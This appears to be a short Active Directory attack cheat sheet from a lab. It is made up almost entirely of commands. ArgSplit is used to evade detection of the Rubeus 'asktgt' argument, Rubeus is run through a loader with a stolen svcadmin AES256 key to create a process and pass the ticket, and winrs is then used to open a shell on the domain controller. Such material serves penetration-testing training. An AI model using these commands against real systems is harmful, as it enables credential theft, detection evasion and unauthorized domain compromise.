**Avoid detection:**
```
C:\Windows\system32>C:\AD\Tools\ArgSplit.bat 
[!] Argument Limit: 180 characters 
[+] Enter a string: asktgt
```

**Get shell with user aes-key:**
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**Try accessing the domain controller from the new process:**
```
winrs -r:corp-pc cmd /c set username
winrs -r:corp-pc cmd
```
